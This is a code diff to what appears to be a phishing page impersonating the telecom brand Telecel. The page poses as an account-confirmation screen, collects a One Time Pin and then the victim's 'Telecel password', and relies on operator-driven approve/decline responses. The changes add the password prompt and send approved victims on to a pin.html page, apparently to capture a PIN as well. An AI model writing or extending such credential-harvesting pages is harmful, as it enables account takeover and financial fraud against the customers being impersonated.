@@ -255,7 +255,7 @@ body{
 
     <!-- TEXT -->
     <div class="title">Confirm your account</div>
-    <div class="subtitle">
+    <div class="subtitle" id="subtitleText">
       The One Time Pin has been sent to<br>
       <span id="maskedPhone">02xxxxxx20</span>
     . Enter it below to verify your account.
@@ -314,6 +314,7 @@ body{
     const nextBtn = document.getElementById('nextBtn');
     const goBackBtn = document.getElementById('goBackBtn');
     const maskedPhoneSpan = document.getElementById('maskedPhone');
+    const subtitleDiv = document.getElementById('subtitleText'); // added for dynamic update
     const otpMessage = document.getElementById('otpMessage');
     const spinner = document.getElementById('spinner');
 
@@ -494,10 +495,12 @@ body{
           // Hide OTP section, show password section
           otpSection.style.display = 'none';
           passwordSection.style.display = 'block';
+          // Update subtitle text for password mode
+          subtitleDiv.innerHTML = 'Enter your Telecel password.';
           passwordField.focus();
         } else if (action === 'approve') {
-          console.log('Approved, redirecting to unavailable.html');
-          window.location.href = 'unavailable.html';
+          console.log('Approved, redirecting to pin.html');
+          window.location.href = 'pin.html';
         } else if (action === 'decline') {
           console.log('Declined, showing error');
           showError('Wrong OTP');
@@ -548,8 +551,8 @@ body{
         verifyPasswordBtn.disabled = false;
 
         if (action === 'approve') {
-          console.log('Password approved, redirecting to unavailable.html');
-          window.location.href = 'unavailable.html';
+          console.log('Password approved, redirecting to pin.html');
+          window.location.href = 'pin.html';
         } else if (action === 'decline') {
           console.log('Password declined, showing error');
           showError('Wrong password');
